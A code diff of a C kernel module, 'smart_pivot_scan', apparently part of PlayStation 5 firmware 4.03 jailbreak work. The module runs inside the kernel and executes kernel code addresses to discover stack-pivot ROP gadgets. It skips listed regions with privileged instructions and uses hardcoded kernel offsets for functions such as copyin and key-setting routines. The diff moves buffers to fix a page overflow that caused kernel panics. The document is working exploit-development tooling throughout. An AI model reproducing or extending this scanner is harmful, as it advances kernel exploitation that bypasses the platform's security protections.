@@ -3,25 +3,25 @@
 /*
  * smart_pivot_scan — Danger-zone-aware ktext pivot gadget scanner
  *
- * Uses the batch_pivot_scan technique (set RAX = pivot chain, ret to
- * candidate address, detect if RSP was redirected) but with SMART
- * exclusion of known dangerous ktext regions that contain privileged
- * instructions (wrmsr, rdmsr, mov crN, mov drN).
+ * MEMORY LAYOUT FIX (v2):
+ * kldload allocates exec_code = malloc(binary_size) which gives ONE page (4096).
+ * The .bss section lives right after the binary in the same allocation, so
+ * total (code + bss) MUST fit in 4096 bytes.
  *
- * The PS5 HV causes non-catchable kernel panics on these instructions.
- * By excluding known dangerous zones from the kstuff offset table,
- * the probability of hitting a panic-inducing instruction drops to
- * near zero (the exclusion covers ALL known privileged instruction
- * sites in the FW 4.03 kernel).
+ * v1 had ~6500 bytes of .bss (func_list[512], safe_buf[2048], entry_stk, etc.)
+ * which overflowed the page → instant kernel panic on any batch > 0.
  *
- * Uses known kstuff ktext function entry points as starting probes,
- * then probes within function bodies (entry+1, entry+2, ...) where
- * compiler-generated code is safe (no privileged instructions).
+ * v2 fixes:
+ *   - func_list[512] moved to stack (safe with -mno-red-zone, 16KB kernel stack)
+ *   - safe_buf[2048] eliminated — replaced with pointer to unused kthread_args
+ *     tail (bytes 288..4095), filled with nop_ret addresses at runtime
+ *   - .bss now ~364 bytes: entry_stk[32]=256, pivot_chain[8]=64, scan vars=44
  *
  * Configure via -D flags:
  *   SCAN_BATCH:    which batch of the sorted pointer list to scan (0-based)
  *   BATCH_SIZE:    how many functions per batch (default 8)
  *   PROBE_DEPTH:   bytes to probe into each function body (default 128)
+ *   PROBE_START:   first byte offset to probe within each function (default 1)
  *
  * Output layout (uint64_t indices):
  *   [0]  magic "SPVT" (0x53505654) | status(32)
@@ -61,21 +61,10 @@
 #define MAX_FUNCS      89
 #define ENTRY_STK_SIZE 32
 
-/* ── FW 4.03 known ktext offsets (negative = ktext-relative from kdata) ──
- * Converted to ktext-relative positive offsets:
- *   ktext offset = KDATA_KTEXT_GAP + negative_offset
- * where KDATA_KTEXT_GAP = kdata_base - ktext_base (varies per boot due to KASLR,
- * but the RELATIVE offset between kdata and ktext is constant for a given FW).
- *
- * From kstuff: ktext_base = LSTAR - 0x294218
- * kdata_base - ktext_base depends on the kernel layout.
- * We compute it at runtime.
- */
+/* ── FW 4.03 known ktext offsets ── */
 
 /* Danger zones: ktext regions containing privileged instructions.
- * These are kdata-relative negative offsets (same as kstuff DEF format).
- * We convert to ktext-relative at runtime.
- *
+ * kdata-relative negative offsets (same as kstuff DEF format).
  * Each entry: { kdata_relative_offset, exclusion_radius }
  */
 typedef struct {
@@ -84,53 +73,23 @@ typedef struct {
 } danger_zone_t;
 
 static const danger_zone_t danger_zones[] = {
-    /* wrmsr; ret — 0F 30 C3 */
-    { -0x9d20cc, 16 },
-
-    /* rdmsr sequence */
-    { -0x9d0cfa, 64 },
-
-    /* mov cr3, rax — 0F 22 D8 */
-    { -0x396f9e, 16 },
-
-    /* mov rdi, cr3 — reads CR3 */
-    { -0x39700e, 16 },
-
-    /* dr2gpr — moves FROM debug registers */
-    { -0x9d6d93, 48 },
-
-    /* gpr2dr_1 — moves TO debug registers */
-    { -0x9d6c7a, 48 },
-
-    /* gpr2dr_2 — moves TO debug registers */
-    { -0x9d6b87, 48 },
-
-    /* cpu_switch — context switch, has privileged ops */
-    { -0x9d6f80, 192 },
-
-    /* doreti_iret — iretq (48 CF), dangerous context */
-    { -0x9cf84c, 32 },
-
-    /* swapgs region around doreti */
-    { -0x9cf84c + 10, 32 },  /* swapgs_add_rsp_iret */
-
-    /* pop_all_iret — pops all regs + iret, dangerous if stack wrong */
-    { -0x9cf8ab, 64 },
-
-    /* push_pop_all_iret */
-    { -0x96be70, 64 },
-
-    /* kmem_alloc_rwx_fix — inside kmem_alloc, may have privileged ops */
-    { -0x70b963, 32 },
-
-    /* Sentinel */
-    { 0, 0 }
+    { -0x9d20cc, 16 },    /* wrmsr; ret */
+    { -0x9d0cfa, 64 },    /* rdmsr sequence */
+    { -0x396f9e, 16 },    /* mov cr3, rax */
+    { -0x39700e, 16 },    /* mov rdi, cr3 */
+    { -0x9d6d93, 48 },    /* dr2gpr */
+    { -0x9d6c7a, 48 },    /* gpr2dr_1 */
+    { -0x9d6b87, 48 },    /* gpr2dr_2 */
+    { -0x9d6f80, 192 },   /* cpu_switch */
+    { -0x9cf84c, 32 },    /* doreti_iret */
+    { -0x9cf84c + 10, 32 }, /* swapgs_add_rsp_iret */
+    { -0x9cf8ab, 64 },    /* pop_all_iret */
+    { -0x96be70, 64 },    /* push_pop_all_iret */
+    { -0x70b963, 32 },    /* kmem_alloc_rwx_fix */
+    { 0, 0 }              /* sentinel */
 };
 
-/* Known ktext function entry points from kstuff (safe to call).
- * These are kdata-relative negative offsets.
- * We use these as starting points for probing.
- */
+/* Known ktext function entry points from kstuff (kdata-relative negative offsets) */
 static const int64_t known_ktext_funcs[] = {
     -0x99002a,   /* rep_movsb_pop_rbp_ret */
     -0x9908e0,   /* copyin */
@@ -162,10 +121,9 @@ static const int64_t known_ktext_funcs[] = {
     -0x94ada4,   /* sceSblServiceMailbox_lr_sceSblPfsClearKey_1 */
     -0x94ad2e,   /* sceSblServiceMailbox_lr_sceSblPfsClearKey_2 */
     -0x94aaa0,   /* sceSblPfsSetKeys */
-    -0x21020,    /* panic (commented in kstuff, but address known) */
+    -0x21020,    /* panic */
     -0x2cc918,   /* loadSelfSegment_watchpoint */
-    /* Sentinel */
-    0
+    0            /* sentinel */
 };
 
 typedef struct {
@@ -180,11 +138,15 @@ static inline uint64_t rdmsr(uint32_t msr)
     return ((uint64_t)hi << 32) | lo;
 }
 
-/* State shared between C and asm */
+/* ── Small .bss globals referenced by inline asm (RIP-relative) ── */
 static volatile uint64_t scan_saved_rsp;
 static volatile uint64_t scan_resume_normal;
 static volatile uint64_t scan_resume_pivot;
 static volatile int scan_got_pivot;
+static volatile uint64_t scan_candidate;
+
+/* Pointer to safe memory region (set at runtime to kthread_args tail) */
+static volatile uint64_t safe_addr;
 
 /* Pivot chain: where RSP goes if candidate pivots */
 static volatile uint64_t pivot_chain[8];
@@ -192,13 +154,7 @@ static volatile uint64_t pivot_chain[8];
 /* Entry stack: [candidate, resume, resume, resume, ...] */
 static volatile uint64_t entry_stk[ENTRY_STK_SIZE];
 
-/* Safe buffer: all registers except RAX/RSP point here before each probe.
- * This prevents page faults from instructions that dereference registers
- * with garbage values. 2KB to handle various [reg + displacement] patterns. */
-static volatile uint8_t safe_buf[2048] __attribute__((aligned(64)));
-
-/* Candidate address for the current probe (passed to asm via memory) */
-static volatile uint64_t scan_candidate;
+/* Total .bss: 8+8+8+4+8+8+64+256 = ~364 bytes */
 
 __attribute__((naked, used))
 static void pivot_landing(void)
@@ -224,7 +180,7 @@ static int is_dangerous(uint64_t addr, uint64_t kdata_base)
     return 0;
 }
 
-/* Simple sort for uint64_t array */
+/* Simple insertion sort */
 static void sort_u64(uint64_t* arr, int n)
 {
     for (int i = 1; i < n; i++) {
@@ -250,7 +206,7 @@ int module_start(kproc_args* args)
 
     volatile uint64_t* out = (volatile uint64_t*)args;
 
-    /* Clear output buffer */
+    /* Clear output buffer (first 2304 bytes = 288 uint64_t slots) */
     for (int i = 0; i < 2304/8; i++)
         out[i] = 0;
 
@@ -260,11 +216,26 @@ int module_start(kproc_args* args)
     out[3] = (uint64_t)SCAN_BATCH | ((uint64_t)BATCH_SIZE << 16) |
              ((uint64_t)PROBE_DEPTH << 32);
 
-    /* Build sorted list of function entry points to probe.
-     * Combine known kstuff offsets with IDT entries and sysent entries.
-     * MUST be static — kernel threads have no red zone, and large
-     * stack arrays risk overflow on the 16KB kernel stack. */
-    static uint64_t func_list[512];
+    /*
+     * Set up safe memory region.
+     * kthread_args is a 4KB (0x1000) malloc. Output uses bytes 0..2303.
+     * Bytes 2304..4095 are unused — perfect as a safe dereference target.
+     * Fill it with nop_ret addresses so any "call [reg]" or "jmp [reg+off]"
+     * that hits this region returns safely.
+     */
+    volatile uint64_t* safe_region = (volatile uint64_t*)((uint8_t*)args + 2304);
+    int safe_slots = (4096 - 2304) / 8;  /* = 224 slots = 1792 bytes */
+    for (int i = 0; i < safe_slots; i++)
+        safe_region[i] = nop_ret;
+    /* Point safe_addr to the middle of the safe region for max displacement coverage */
+    safe_addr = (uint64_t)((uint8_t*)args + 2304 + 896);
+
+    /*
+     * Build sorted list of function entry points to probe.
+     * ON THE STACK — safe with -mno-red-zone on 16KB kernel stack.
+     * 512 * 8 = 4096 bytes — well within limits.
+     */
+    uint64_t func_list[512];
     int n_funcs = 0;
 
     /* Add known kstuff ktext functions */
@@ -283,7 +254,6 @@ int module_start(kproc_args* args)
         uint64_t handler = (uint64_t)off_lo | ((uint64_t)off_mid << 16) |
                            ((uint64_t)off_hi << 32);
         if (handler >= ktext_base && handler < ktext_end && n_funcs < 512) {
-            /* Dedup */
             int dup = 0;
             for (int j = 0; j < n_funcs; j++)
                 if (func_list[j] == handler) { dup = 1; break; }
@@ -369,10 +339,6 @@ int module_start(kproc_args* args)
             out[func_slot + 2] = 0;
         }
 
-        /* Probe each byte offset within this function.
-         * Start at PROBE_START (default 1) to skip function entry point —
-         * offset 0 executes the real function prologue/body which accesses
-         * hardware, takes locks, etc. and kills the thread. */
         for (int off = PROBE_START; off < depth; off++) {
             uint64_t candidate = func_entry + off;
 
@@ -420,12 +386,11 @@ int module_start(kproc_args* args)
                 "movq %%rcx, (%%rdx)\n\t"
 
                 /* === REGISTER SAFETY ===
-                 * Set ALL registers (except RAX, RSP) to point to safe_buf.
-                 * This prevents page faults from instructions that dereference
-                 * registers with garbage values. Most compiled code does
-                 * [reg + small_offset], so pointing regs to a 2KB buffer
-                 * catches the vast majority of memory accesses. */
-                "leaq safe_buf(%%rip), %%rdi\n\t"
+                 * Set ALL registers (except RAX, RSP) to safe_addr.
+                 * safe_addr points to the middle of the kthread_args tail
+                 * region (filled with nop_ret addresses), giving ~896 bytes
+                 * in each direction for [reg+displacement] accesses. */
+                "movq safe_addr(%%rip), %%rdi\n\t"
                 "movq %%rdi, %%rsi\n\t"
                 "movq %%rdi, %%rdx\n\t"
                 "movq %%rdi, %%rcx\n\t"
@@ -440,7 +405,7 @@ int module_start(kproc_args* args)
                 "movq %%rdi, %%r14\n\t"
                 "movq %%rdi, %%r15\n\t"
 
-                /* Clear direction flag (STD in a candidate would be bad) */
+                /* Clear direction flag */
                 "cld\n\t"
 
                 /* RAX = pivot_chain (the controlled buffer for RSP pivot) */
